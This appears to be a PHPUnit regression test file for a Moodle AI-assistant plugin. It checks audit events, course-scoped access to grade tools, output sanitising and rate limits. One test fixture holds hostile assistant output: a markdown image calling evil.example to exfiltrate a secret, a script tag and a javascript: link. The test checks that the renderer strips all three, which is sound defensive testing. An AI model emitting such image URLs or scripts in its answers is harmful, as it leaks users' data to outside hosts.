<?php
// This file is part of Moodle - https://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <https://www.gnu.org/licenses/>.

/**
 * Regression tests for the 2026-10 pre-release audit fixes.
 *
 * These lock in two defects the audit found, so they cannot silently return:
 *  - the grant_changed event threw on every trigger (missing objecttable), leaving the governance
 *    audit trail permanently empty;
 *  - the grade-domain tools bypassed the shared gate(), so a per-grant course scope was ignored.
 *
 * @package    local_groundedai
 * @copyright  2026 Vbounds LLC (Sternfast)
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

namespace local_groundedai;

use local_groundedai\local\access_manager;
use local_groundedai\local\conversation;
use local_groundedai\local\rate_limiter;
use local_groundedai\local\staff\tools;

/**
 * The grant audit trail fires, the read wall (course scope) covers the grade tools, and the assistant
 * output wall strips the remote-image exfiltration channel.
 *
 * @covers \local_groundedai\event\grant_changed
 * @covers \local_groundedai\local\staff\tools
 * @covers \local_groundedai\local\conversation
 */
final class accesswall_regression_test extends \advanced_testcase {
    /**
     * Reset the per-request caches so one test's grants cannot leak into the next.
     */
    protected function setUp(): void {
        parent::setUp();
        tools::reset_caches();
        access_manager::reset_caches();
    }

    /**
     * B1: triggering grant_changed must NOT throw (it carries an objectid, so core requires an
     * objecttable) and must reach the event sink — otherwise the governance audit trail is empty.
     */
    public function test_grant_changed_event_triggers_and_is_recorded(): void {
        $this->resetAfterTest();
        $this->setAdminUser();

        $sink = $this->redirectEvents();
        $event = \local_groundedai\event\grant_changed::create([
            'context'  => \context_system::instance(),
            'objectid' => 123,
            'other'    => ['action' => 'created', 'grantee' => 'role 5'],
        ]);
        $event->trigger();

        $recorded = array_values(array_filter(
            $sink->get_events(),
            static fn($e) => $e instanceof \local_groundedai\event\grant_changed
        ));
        $this->assertCount(1, $recorded, 'grant_changed must reach the log store, not throw before dispatch');
        $this->assertSame(123, (int) $recorded[0]->objectid);
        // The description is id-based only — never a name or email.
        $this->assertStringContainsString('123', $recorded[0]->get_description());
    }

    /**
     * B2/M1: a grade tool must honour the grant's course scope. A teacher enrolled in two courses, but
     * granted only over course A, may read whole-class grades in A and is refused in B — even though they
     * hold grade:viewall in B by their enrolment there.
     */
    public function test_grade_overview_respects_course_scope(): void {
        $this->resetAfterTest();
        $coursea = $this->getDataGenerator()->create_course();
        $courseb = $this->getDataGenerator()->create_course();
        $teacher = $this->getDataGenerator()->create_user();
        $this->getDataGenerator()->enrol_user((int) $teacher->id, (int) $coursea->id, 'editingteacher');
        $this->getDataGenerator()->enrol_user((int) $teacher->id, (int) $courseb->id, 'editingteacher');

        // Grant limited to course A only, with the grades domain.
        access_manager::add_user_grant(
            (int) $teacher->id,
            access_manager::SCOPE_COURSE,
            (int) $coursea->id,
            0,
            ['grades'],
            []
        );
        access_manager::reset_caches();

        $ina = tools::dispatch('get_grade_overview', ['courseid' => (int) $coursea->id], (int) $teacher->id);
        $this->assertArrayNotHasKey('error', $ina, 'the granted course must pass the gate');

        $inb = tools::dispatch('get_grade_overview', ['courseid' => (int) $courseb->id], (int) $teacher->id);
        $this->assertArrayHasKey('error', $inb, 'a course outside the grant scope must be refused by a grade tool');
    }

    /**
     * B2/M1: the same scope wall applies to the module-context grade tools (quiz/assignment), which also
     * used to bypass the gate — a course outside the grant is refused before any module lookup.
     */
    public function test_assignment_status_respects_course_scope(): void {
        $this->resetAfterTest();
        $coursea = $this->getDataGenerator()->create_course();
        $courseb = $this->getDataGenerator()->create_course();
        $assign = $this->getDataGenerator()->create_module('assign', ['course' => $courseb->id]);
        $teacher = $this->getDataGenerator()->create_user();
        $this->getDataGenerator()->enrol_user((int) $teacher->id, (int) $coursea->id, 'editingteacher');
        $this->getDataGenerator()->enrol_user((int) $teacher->id, (int) $courseb->id, 'editingteacher');

        access_manager::add_user_grant(
            (int) $teacher->id,
            access_manager::SCOPE_COURSE,
            (int) $coursea->id,
            0,
            ['grades'],
            []
        );
        access_manager::reset_caches();

        // The assignment is in course B, which is outside the grant scope: refused at the course gate.
        $result = tools::dispatch(
            'get_assignment_status',
            ['courseid' => (int) $courseb->id, 'cmid' => (int) $assign->cmid],
            (int) $teacher->id
        );
        $this->assertArrayHasKey('error', $result);
    }

    /**
     * LLM05 output wall: the rendered assistant HTML must not carry a remote image (the zero-click
     * markdown-image exfiltration channel), a script, or a javascript: link — while a normal link stays.
     */
    public function test_assistant_output_strips_exfiltration_channels(): void {
        $this->resetAfterTest();
        $context = \context_system::instance();

        $markdown = "Here is a summary.\n\n"
            . "![pixel](https://evil.example/collect?d=secret)\n\n"
            . "<script>alert('x')</script>\n\n"
            . "[click me](javascript:alert('x'))\n\n"
            . "See https://moodle.example/course/view.php?id=2 for details.";
        $html = conversation::render_assistant_html($markdown, $context);

        $this->assertStringNotContainsStringIgnoringCase('<img', $html, 'a model-emitted image must be stripped');
        $this->assertStringNotContainsStringIgnoringCase('evil.example', $html, 'the exfiltration URL must not survive as a src');
        $this->assertStringNotContainsStringIgnoringCase('<script', $html, 'scripts must be cleaned');
        $this->assertStringNotContainsStringIgnoringCase('javascript:', $html, 'javascript: schemes must not survive');
        // A legitimate http(s) link is still linked for the staff user.
        $this->assertStringContainsString('moodle.example/course/view.php', $html, 'a normal link must survive');
    }

    /**
     * LLM10 denial-of-wallet guard: the per-user hourly cap allows up to the limit, then refuses.
     */
    public function test_rate_limiter_caps_questions_per_hour(): void {
        $this->resetAfterTest();
        set_config('maxperhour', 2, 'local_groundedai');
        $userid = (int) $this->getDataGenerator()->create_user()->id;

        rate_limiter::check($userid);   // 1st — ok.
        rate_limiter::check($userid);   // 2nd — ok.
        try {
            rate_limiter::check($userid);   // 3rd — over the limit.
            $this->fail('the third question in the hour must be refused');
        } catch (\moodle_exception $e) {
            $this->assertSame('ratelimited', $e->errorcode);
        }

        // A different user is unaffected, and 0 means unlimited.
        $other = (int) $this->getDataGenerator()->create_user()->id;
        rate_limiter::check($other);
        set_config('maxperhour', 0, 'local_groundedai');
        for ($i = 0; $i < 5; $i++) {
            rate_limiter::check($userid);   // No exception when unlimited.
        }
        $this->assertTrue(true);
    }
}
